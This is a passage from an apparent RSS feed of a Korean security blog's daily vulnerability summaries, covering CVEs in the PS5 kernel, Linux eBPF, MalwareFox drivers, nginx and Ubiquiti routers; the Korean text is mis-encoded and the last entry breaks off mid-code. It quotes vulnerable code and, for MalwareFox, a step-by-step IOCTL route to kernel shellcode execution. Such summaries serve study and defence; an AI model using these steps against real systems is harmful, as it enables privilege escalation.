      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://hackerone.com/reports/1048322&quot;&gt;SMAP bypass(PS5)&lt;/</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/1048322">SMAP bypass(PS5)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>PlayStation5, FreeBSD 12</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>SMAP(Supervisor-Mode Access Prevention)ì€ ì»¤ë„ì—ì„œ ìœ ì €ëœë“œ ë©”ëª¨ë¦¬ì— ì ‘ê·¼í•˜ì§€ ëª»í•˜ê²Œ í•˜ì—¬ ì·¨ì•½ì  ìµìŠ¤í”Œë¡œì‡ì„ ì–´ë µê²Œ í•˜ëŠ” ì»¤ë„ ë ˆë²¨ ë³´í˜¸ê¸°ë²•ì…ë‹ˆë‹¤.</p><p>PlayStation 5(ì´í•˜ PS5)ëŠ” FreeBSD 12 ê¸°ë°˜ìœ¼ë¡œ ê°œë°œëœ ìš´ì˜ì²´ì œì¸ Orbis 2.0ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. CVE-2021-29628ì€ FreeBSD 12ì—ì„œ ë°œê²¬ëì—ˆë˜ ì·¨ì•½ì ì´ì§€ë§Œ, PS5ì—ì„œ ì´ ì·¨ì•½ì ì— ëŒ€í•´ íŒ¨ì¹˜ë¥¼ í•˜ì§€ ì•Šì•„ PS5ì—ì„œ SMAPë¥¼ bypassí•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.</p><p>PS5ì—ì„œ SMAPê°€ í™œì„±í™”ë˜ì–´ ìˆëŠ” ìƒíƒœ(<code>Rflags</code>ì˜ <code>Alignment Check Flag</code>, <code>%RFLAGS.AC</code>ê°€ ì„¸íŒ…ë˜ì§€ ì•Šì€ ìƒíƒœ)ì—ì„œ ì»¤ë„ì—ì„œ ìœ ì € í˜ì´ì§€ì— ì ‘ê·¼í•˜ë©´ page faultê°€ ë°œìƒí•©ë‹ˆë‹¤. ë°˜ë©´ì— <code>%RFLAGS.AC</code>ê°€ ì„¸íŒ…ë˜ì§€ ì•Šì€ ìƒíƒœì—ì„œëŠ” ì»¤ë„ì—ì„œ ì •ìƒì ìœ¼ë¡œ ìœ ì € í˜ì´ì§€ì— ì ‘ê·¼ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ FreeBSD ì»¤ë„ì—ì„œëŠ” <code>copyin()</code>ê³¼ <code>copyout()</code> í•¨ìˆ˜ë“¤ì„ í†µí•´ <code>%RFLAGS.AC</code>ë¥¼ ì ì‹œ ì„¸íŒ…í•´ì„œ ìœ ì € í˜ì´ì§€ì— ì ‘ê·¼í•©ë‹ˆë‹¤.</p><pre><code class="hljs wasm">.macroCOPYIN smap erms&#x2F;* ... *&#x2F;movq$copy_fault,PCB_ONFAULT(%r11)&#x2F;* ... *&#x2F;stac &#x2F;&#x2F; set %RFLAGS.AC, to allow access to user pagesdo_the_copyinclac &#x2F;&#x2F; clear %RFLAGS.AC, to forbid access to user pages&#x2F;* ... *&#x2F;copy_fault:movq$0,PCB_ONFAULT(%r11)movl$EFAULT,%eaxPOP_FRAME_POINTERret</code></pre><p><code>copyin()</code> í•¨ìˆ˜ê°€ ì‹¤í–‰ë˜ë©´ fault handlerì¸ <code>copy_fault()</code> í•¨ìˆ˜ë¥¼ handlerë¡œ ë“±ë¡í•œ í›„ <code>%RFLAGS.AC</code>ë¥¼ ì„¸íŒ…í•´ ë³µì‚¬ ì‘ì—…ì„ ì§„í–‰í•©ë‹ˆë‹¤. ê·¸ë¦¬ê³  ë³µì‚¬ ì‘ì—…ì´ ëë‚˜ë©´ ë‹¤ì‹œ <code>%RFLAGS.AC</code>ë¥¼ í´ë¦¬ì–´í•©ë‹ˆë‹¤. ì´ ë•Œ, ë³µì‚¬ ê³¼ì •ì—ì„œ faultê°€ ë°œìƒí•˜ë©´ <code>trap()</code>í•¨ìˆ˜ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-keyword">void</span>trap(struct trapframe *frame)&#123;<span class="hljs-comment">/* ... */</span><span class="hljs-keyword">if</span> (curpcb-&gt;pcb_onfault != <span class="hljs-literal">NULL</span>) &#123;frame-&gt;tf_rip = (<span class="hljs-keyword">long</span>)curpcb-&gt;pcb_onfault;<span class="hljs-keyword">return</span>;&#125;<span class="hljs-comment">/* ... */</span>&#125;</code></pre><p><code>trap()</code> í•¨ìˆ˜ì—ì„œëŠ” <code>curpcb-&gt;pcb_onfault</code>ì— ê°’ì´ ë“¤ì–´ê°€ ìˆìœ¼ë©´ ì´ ì•ˆì— ê°’ì„ <code>framâ†’tf_rip</code>ì— ë„£ê³  ë°”ë¡œ return í•˜ëŠ”ë°, ì´ ë•Œ <code>%RFLAGS.AC</code>ë¥¼ í´ë¦¬ì–´í•˜ì§€ ì•Šì•„ SMAPì´ ë¹„í™œì„±í™”ì¸ ìƒíƒœë¡œ í•¸ë“¤ë§ì„ ë§ˆë¬´ë¦¬í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì´ë¥¼ í†µí•´ SMAPë¥¼ bypassí•˜ì—¬ ì´ ì´í›„ì˜ syscallë“¤ì„ SMAPì´ ë¹„í™œì„±í™”ëœ ìƒíƒœì—ì„œ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/smap/">smap</category>
      
      <category domain="https://hackyboiz.github.io/tags/freebsd/">freebsd</category>
      
      <category domain="https://hackyboiz.github.io/tags/playstation5/">playstation5</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/30/j0ker/2021-05-30/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[í•˜ë£¨í•œì¤„] CVE-2021-31440: Linux Kernel eBPF verifier, incorrect bound check</title>
      <link>https://hackyboiz.github.io/2021/05/29/fabu1ous/2021-05-29/</link>
      <guid>https://hackyboiz.github.io/2021/05/29/fabu1ous/2021-05-29/</guid>
      <pubDate>Sat, 29 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/5/26/cve-2021</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/5/26/cve-2021-31440-an-incorrect-bounds-calculation-in-the-linux-kernel-ebpf-verifier">CVE-2021-31440: AN INCORRECT BOUNDS CALCULATION IN THE LINUX KERNEL EBPF VERIFIER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Linux kernel 5.7 ~ Linux kernel 5.11.15</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>eBPFëŠ” ëŸ°íƒ€ì„ ì¤‘ ì•ˆì „í•˜ê²Œ ì»¤ë„ ì½”ë“œë¥¼ ì‚½ì…í•˜ê¸° ìœ„í•´ Verifierì™€ BPF instructionì„ ì‚¬ìš©í•©ë‹ˆë‹¤. VerifierëŠ” ë ˆì§€ìŠ¤í„°ì˜ ê°’ì˜ ë³€í™”ì™€ ê·¸ ê°’ë“¤ì˜ í—ˆìš© ë²”ìœ„(ì´í•˜ range)ë“±ì„ ì¶”ì í•´ memory loadì™€ storeì˜ out-of-bound ì—¬ë¶€ë¥¼ ê²€ì‚¬í•©ë‹ˆë‹¤. CVE-2021-31440ì„ ì•…ìš©í•˜ë©´ out-of-bound ê²€ì‚¬ë¥¼ ë¬´ë ¥í™”í•˜ê³  ë¡œì»¬ ê¶Œí•œ ìƒìŠ¹ì„ ë…¸ë¦´ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs c">...    <span class="hljs-keyword">if</span> (__reg64_bound_u32(reg-&gt;umin_value))             reg-&gt;u32_min_value = (u32)reg-&gt;umin_value;     <span class="hljs-keyword">if</span> (__reg64_bound_u32(reg-&gt;umax_value))             reg-&gt;u32_max_value = (u32)reg-&gt;umax_value;...</code></pre><p>ìœ„ëŠ” ì·¨ì•½í•œ ì½”ë“œ ë¶€ë¶„ì˜ ì¼ë¶€ì…ë‹ˆë‹¤. ê¸°ì¡´ eBPF ì·¨ì•½ì ë“¤ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ CVE-2021-31440 ë˜í•œ 64 bit rangeì˜ í•˜ìœ„ 32 ë¹„íŠ¸ë¡œë¶€í„° 32 bit rangeë¥¼ ë„ì¶œí•˜ëŠ” ê³¼ì •ì—ì„œ ë²„ê·¸ê°€ ë°œìƒí•©ë‹ˆë‹¤. <code>umin_value</code>ê°€ 1, <code>umax_value</code> ê°€ 1&lt;&lt;32ì´ë¼ í•  ë•Œ <code>u32_min_value</code>ëŠ” 1, <code>u32_max_value</code>ëŠ” 0ìœ¼ë¡œ ì„¤ì •ë˜ê³  ì‹¤ì œ runtime rangeì™€ ë‹¤ë¥¸ ê°’ì„ Verifierì—ê²Œ ì „ë‹¬í•˜ê²Œ ë©ë‹ˆë‹¤.</p><p>VerifierëŠ” ì˜ëª»ëœ ë ˆì§€ìŠ¤í„° í—ˆìš©ë²”ìœ„ë¥¼ ê°–ê²Œ ë˜ê³  ì´ë¥¼ í†µí•´ í•´ì»¤ëŠ” out-of-bound read/write accessê°€ ê°€ëŠ¥í•´ ë¡œì»¬ ê¶Œí•œ ìƒìŠ¹ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/linux/">linux</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/oob/">oob</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/29/fabu1ous/2021-05-29/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[í•˜ë£¨í•œì¤„] CVE-2021-31727/31728: MalwareFox AntiMalware ë¡œì»¬ ê¶Œí•œìƒìŠ¹ ì·¨ì•½ì </title>
      <link>https://hackyboiz.github.io/2021/05/28/l0ch/2021-05-28/</link>
      <guid>https://hackyboiz.github.io/2021/05/28/l0ch/2021-05-28/</guid>
      <pubDate>Fri, 28 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/irql0/CVE-2021-31728&quot;&gt;CVE-2021-31728&lt;/</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/irql0/CVE-2021-31728">CVE-2021-31728</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MalwareFox AntiMalware 2.74.0.150</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì•ˆí‹° ë©€ì›¨ì–´ ì†Œí”„íŠ¸ì›¨ì–´ì¸ MalwareFoxì—ì„œ ë°œê²¬ëœ ë¡œì»¬ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ì˜ ì„¸ë¶€ ì •ë³´ ë° PoCê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤. ê³µê°œëœ ì·¨ì•½ì ì€ ë‘ ê°€ì§€ë¡œ, ëª¨ë‘ MalwareFoxì˜ <code>zam64.sys</code> ë° <code>zam32.sys</code> ë“œë¼ì´ë²„ì— ì¡´ì¬í•©ë‹ˆë‹¤. </p><h3 id="CVE-2021-31727"><a href="#CVE-2021-31727" class="headerlink" title="CVE-2021-31727"></a>CVE-2021-31727</h3><p><code>zam64.sys</code>/<code>zam32.sys</code> ë“œë¼ì´ë²„ì˜ IOCTL <code>0x80002014</code> ë° <code>0x80002018</code> ì€ unrestricted disk read/writeê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. í•´ì»¤ëŠ” ì´ë¥¼ ì•…ìš©í•´ ë¶€íŠ¸ ì„¹í„°ë¥¼ ë®ì–´ì“°ê±°ë‚˜ ë©”ëª¨ë¦¬ ìƒì˜ ì½”ë“œë¥¼ ë®ì–´ì“°ëŠ” ë°©ì‹ìœ¼ë¡œ ê¶Œí•œ ìƒìŠ¹ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h3 id="CVE-2021-31728"><a href="#CVE-2021-31728" class="headerlink" title="CVE-2021-31728"></a>CVE-2021-31728</h3><p>IOCTL <code>0x80002040</code>ì€ UserBufferì—ì„œ ë³µì‚¬ë˜ëŠ” ëŒ€ìƒ ë²„í¼ì¸ NonPagedPoolì—ì„œ ì»¤ë„ ë©”ëª¨ë¦¬ê°€ í• ë‹¹ë˜ë©° ì…ë ¥ ë²„í¼ê°€ <code>0x1000</code> bytesë³´ë‹¤ ì»¤ ì‰˜ì½”ë“œì— ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. IOCTL <code>0x80002018</code> ì€ miniport ë“œë¼ì´ë²„ì˜ IRP_MJ_SCSI_HANDLERì— ëŒ€í•œ í•¨ìˆ˜ë¥¼ ì„¤ì •í•  ìˆ˜ ìˆìœ¼ë©° ì‚¬ìš©ì ì…ë ¥ì— ì˜í•´ ì§€ì •ëœ ë“œë¼ì´ë²„ì— SCSI ìš”ì²­ì„ ë³´ë‚´ ì´ë¥¼ ì´ìš©í•´ ì‰˜ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ìœ„ ì·¨ì•½ì ì„ ì•…ìš©í•˜ë©´ ì•„ë˜ ë°©ë²•ìœ¼ë¡œ ë“œë¼ì´ë²„ ì»¨í…ìŠ¤íŠ¸ì˜ ring0 ì½”ë“œë¥¼ ì‹¤í–‰í•´ ì‹œìŠ¤í…œ ê¶Œí•œìœ¼ë¡œ í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹¤í–‰ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><ol><li>IOCTL <code>0x80002010</code>ìœ¼ë¡œ <code>\.\ZemanaAntiMalware</code> ì— ëŒ€í•œ í•¸ë“¤ì„ ê°€ì ¸ì˜´</li><li>IOCTL <code>0x80002040</code>ìœ¼ë¡œ NonPagedPoolì— ì»¤ë„ ë©”ëª¨ë¦¬ í• ë‹¹</li><li><code>SystemBigPoolInformation</code>ë¡œ í• ë‹¹ëœ ì»¤ë„ ë©”ëª¨ë¦¬ ê²€ìƒ‰</li><li>IOCTL <code>0x80002044</code>ë¡œ miniport ë“œë¼ì´ë²„ êµ¬ì„±</li><li>IOCTL <code>0x80002014</code> ë˜ëŠ” <code>0x80002018</code>ë¡œ í•´ì»¤ê°€ ì •ì˜í•œ miniport ë“œë¼ì´ë²„ ì‹¤í–‰</li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/local-privilege-escalation/">local privilege escalation</category>
      
      <category domain="https://hackyboiz.github.io/tags/antimalware/">antimalware</category>
      
      <category domain="https://hackyboiz.github.io/tags/driver-exploit/">driver exploit</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/28/l0ch/2021-05-28/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[í•˜ë£¨í•œì¤„] CVE-2021-23017: nginx DNS Resolver Off-by-One Heap Write Vulnerability</title>
      <link>https://hackyboiz.github.io/2021/05/27/idioth/2021-05-27/</link>
      <guid>https://hackyboiz.github.io/2021/05/27/idioth/2021-05-27/</guid>
      <pubDate>Thu, 27 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://x41-dsec.de/lab/advisories/x41-2021-002-nginx-res</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://x41-dsec.de/lab/advisories/x41-2021-002-nginx-resolver-copy/">Advisory X41-2021-002: nginx DNS Resolver Off-by-One Heap Write Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>nginx 0.6.18 - 1.20.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì˜¤í”ˆ ì†ŒìŠ¤ ì›¹ ì„œë²„ í”„ë¡œê·¸ë¨ nginxì˜ <code>ngx_resolver_copy()</code>ì—ì„œ DNS responseë¥¼ ì²˜ë¦¬í•˜ëŠ” ë™ì•ˆ ë°œìƒí•˜ëŠ” off-by-oneìœ¼ë¡œ ì¸í•´ heap ì˜ì—­ì˜ 1-byte ë©”ëª¨ë¦¬ë¥¼ ë®ì–´ì“¸ ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p><code>ngx_resolver_copy()</code>ëŠ” DNS responseì— í¬í•¨ëœ DNS ë„ë©”ì¸ ì´ë¦„ì˜ ìœ íš¨ì„±ì„ ê²€ì‚¬í•˜ê³  ì••ì¶•ì„ í•´ì œí•˜ëŠ” ì‘ì—…ì„ ë‹¤ìŒ ë‘ ë‹¨ê³„ë¡œ ì²˜ë¦¬í•©ë‹ˆë‹¤.</p><ol><li>ì••ì¶•ë˜ì§€ ì•Šì€ ë„ë©”ì¸ ì´ë¦„ í¬ê¸°ì¸ <code>len</code>ì„ ê³„ì‚°í•˜ê³  128 í¬ì¸í„°ê°€ ë„˜ì–´ê°€ê±°ë‚˜ ë²„í¼ì˜ ë²”ìœ„ë¥¼ ë²—ì–´ë‚˜ëŠ” ë¶€ë¶„ì„ ë²„ë¦½ë‹ˆë‹¤.</li><li>Output bufferë¥¼ í• ë‹¹í•˜ê³  ì••ì¶•ë˜ì§€ ì•Šì€ ì´ë¦„ì„ ë³µì‚¬í•©ë‹ˆë‹¤.</li></ol><p>ì´ ê³¼ì •ì—ì„œ 1ë²ˆì˜ <code>len</code>ê³¼ 2ë²ˆì— ì••ì¶•ë˜ì§€ ì•Šì€ ì´ë¦„ì˜ í¬ê¸°ê°€ ë‹¬ë¼ <code>name-&gt;data</code>ì—ì„œ 1 ë°”ì´íŠ¸ë¥¼ ë²—ì–´ë‚˜ ë®ì–´ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>nginx DNS responseë¥¼ ë°›ê¸° ìœ„í•´ DNS requestë¥¼ ë³´ë‚¸ í›„, <code>QNAME</code>, <code>NAME</code>, <code>RDATA</code> ì¤‘ í•˜ë‚˜ì˜ ê°’ì„ í†µí•´ í•´ë‹¹ ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ <code>CNAME</code>ì„ ì‚¬ìš©í•  ê²½ìš° ì¬ê·€ì ìœ¼ë¡œ ì²˜ë¦¬ë˜ì–´ <code>ngx_resolve_name_locked()</code>ê°€ í˜¸ì¶œë  ë•Œ ì¶”ê°€ì ì¸ OOB writeê°€ ê°€ëŠ¥í•˜ê³  <code>ngx_resolver_dup()</code>ê³¼ <code>ngx_crc32_short()</code>ë¥¼ í†µí•´ OOB readê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì˜ POC ì½”ë“œëŠ” <a href="https://github.com/x41sec/advisories/blob/master/X41-2021-002/poc.py">github</a>ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/oob-read/">oob read</category>
      
      <category domain="https://hackyboiz.github.io/tags/dns-resolver/">dns resolver</category>
      
      <category domain="https://hackyboiz.github.io/tags/oob-write/">oob write</category>
      
      <category domain="https://hackyboiz.github.io/tags/nginx/">nginx</category>
      
      <category domain="https://hackyboiz.github.io/tags/dns/">dns</category>
      
      <category domain="https://hackyboiz.github.io/tags/off-by-one/">off-by-one</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/27/idioth/2021-05-27/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[í•˜ë£¨í•œì¤„] CVE-2021-22909: Ubiquiti ë¼ìš°í„° íŒì›¨ì–´ ì—…ë°ì´íŠ¸ ì·¨ì•½ì </title>
      <link>https://hackyboiz.github.io/2021/05/26/fabu1ous/2021-05-26/</link>
      <guid>https://hackyboiz.github.io/2021/05/26/fabu1ous/2021-05-26/</guid>
      <pubDate>Wed, 26 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/5/24/cve-2021</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/5/24/cve-2021-22909-digging-into-a-ubiquiti-firmware-update-bug">CVE-2021-22909- DIGGING INTO A UBIQUITI FIRMWARE UPDATE BUG</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Ubiquiti EdgeRouter</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>CVE-2021-22909ì— ëŒ€í•œ íŒ¨ì¹˜ê°€ ì´ë£¨ì–´ì¡ŒìŠµë‹ˆë‹¤. Ubiquiti EdgeRouterì˜ íŒì›¨ì–´ ì—…ë°ì´íŠ¸ ì‘ì—…ì— MiTM(man-in-the-middle) ê³µê²©ì— ëŒ€í•œ ë°©ì§€ ë¶€ì¬ë¡œ ì¸í•´ ë¼ìš°í„° ê¸°ê¸°ì— ì•…ì„± íŒì›¨ì–´ ì´ë¯¸ì§€ë¥¼ ì„¤ì¹˜í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. í•´ì»¤ëŠ” ì´ë¥¼ ì•…ìš©í•´ ë¼ìš°í„° ê¸°ê¸°ì— ì•…ì„± íŒì›¨ì–´ë¥¼ ì„¤ì¹˜í•  ìˆ˜ ìˆê³  root ê¶Œí•œìœ¼ë¡œ ì„ì˜ ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>Ubiquiti EdgeRouterëŠ” templated operational commandë¥¼ ì§€ì›í•©ë‹ˆë‹¤. Templated operational commandë€ ë¼ìš°í„°ì˜ ì„¤ì •ì„ ë¹ ë¥´ê³  ê°„í¸í•˜ê²Œ ìˆ˜ì •í•  ìˆ˜ ìˆë„ë¡ ì§œì¸ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ ëª…ë ¹ì–´ì…ë‹ˆë‹¤. ìœ ì €ê°€ CLIì— <code>add system image</code>ë¥¼ ì…ë ¥í•˜ë©´ <code>ubnt-fw-latest</code> ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë˜ì–´ íŒì›¨ì–´ë¥¼ ì—…ë°ì´íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><code>unbt-fw-latest</code> ìŠ¤í¬ë¦½íŠ¸ëŠ” <code>upgrade_firmware()</code>í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•´ Ubiquiti update serverë¡œë¶€í„° ë‹¤ìš´ ë¡œë“œ URLì„ í¬í•¨í•œ ìµœì‹  íŒì›¨ì–´ ì •ë³´ë¥¼ ë°›ì•„ì˜µë‹ˆë‹¤. ê·¸ í›„ ë°›ì•„ì˜¨ ì •ë³´ë¥¼ íŒŒì‹± í•´ í˜„ì¬ íŒì›¨ì–´ ë²„ì „ê³¼ ë¹„êµí•˜ê³  ì—…ë°ì´íŠ¸ê°€ ê°€ëŠ¥í•˜ë©´ <code>ubnt-upgrade</code> ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•´ ì œê³µë°›ì€ urlë¡œë¶€í„° íŒì›¨ì–´ë¥¼ ì„¤ì¹˜í•©ë‹ˆë‹¤.</p><p><code>ubnt-upgrade</code> ìŠ¤í¬ë¦½íŠ¸ê°€ í˜¸ì¶œí•˜ëŠ” <code>get_tar_by_url()</code> í•¨ìˆ˜ëŠ” curl ì»¤ë§¨ë“œë¥¼ ì‚¬ìš©í•´ íŒì›¨ì–´ë¥¼ ì„¤ì¹˜í•˜ëŠ”ë° -k ì˜µì…˜(TLS ì¸ì¦ì„œ ê²€ì¦ ë¹„í™œì„±í™”)ì´ ì„¤ì •ë˜ì–´ìˆì–´ ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤. í•´ì»¤ëŠ” MITMìœ¼ë¡œ ìì‹ ì˜ ë„ë©”ì¸ì„ ì†ì—¬ ë¼ìš°í„°ì— ì•…ì„± íŒì›¨ì–´ë¥¼ ì„¤ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs powershell">get_tar_by_url () &#123;     mkdir <span class="hljs-variable">$TMP_DIR</span>     <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$NOPROMPT</span>&quot;</span> -<span class="hljs-type">eq</span> <span class="hljs-number">0</span> ]; then         <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Trying to get upgrade file from <span class="hljs-variable">$TAR</span>&quot;</span>     fi       <span class="hljs-keyword">if</span> [ -<span class="hljs-type">n</span> <span class="hljs-string">&quot;<span class="hljs-variable">$USERNAME</span>&quot;</span> ]; then         auth=<span class="hljs-string">&quot;-u <span class="hljs-variable">$USERNAME:</span><span class="hljs-variable">$PASSWORD</span>&quot;</span>     <span class="hljs-keyword">else</span>         auth=<span class="hljs-string">&quot;&quot;</span>     fi       filename=<span class="hljs-string">&quot;<span class="hljs-variable">$</span>&#123;TMP_DIR&#125;/<span class="hljs-variable">$</span>&#123;TAR##*/&#125;&quot;</span>     <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$NOPROMPT</span>&quot;</span> -<span class="hljs-type">eq</span> <span class="hljs-number">0</span> ]; then         <span class="hljs-built_in">curl</span> <span class="hljs-literal">-k</span> <span class="hljs-variable">$auth</span> <span class="hljs-operator">-f</span> <span class="hljs-literal">-L</span> <span class="hljs-literal">-o</span> <span class="hljs-variable">$filename</span> <span class="hljs-variable">$TAR</span>      <span class="hljs-comment"># &lt;-----  </span>    <span class="hljs-keyword">else</span>         <span class="hljs-built_in">curl</span> <span class="hljs-literal">-k</span> <span class="hljs-variable">$auth</span> <span class="hljs-operator">-f</span> <span class="hljs-literal">-s</span> <span class="hljs-literal">-L</span> <span class="hljs-literal">-o</span> <span class="hljs-variable">$filename</span> <span class="hljs-variable">$TAR</span>   <span class="hljs-comment"># &lt;----- </span>    fi     <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$</span>? -<span class="hljs-type">ne</span> <span class="hljs-number">0</span> ]; then         <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Unable to get upgrade file from <span class="hljs-variable">$TAR</span>&quot;</span>         <span class="hljs-built_in">rm</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$filename</span>         <span class="hljs-built_in">rm</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$DOWNLOADING</span>         <span class="hljs-keyword">exit</span> <span class="hljs-number">1</span>     fi       <span class="hljs-keyword">if</span> [ ! -<span class="hljs-type">e</span> <span class="hljs-variable">$filename</span> ]; then         <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Download of <span class="hljs-variable">$TAR</span> failed&quot;</span>         <span class="hljs-built_in">rm</span> <span 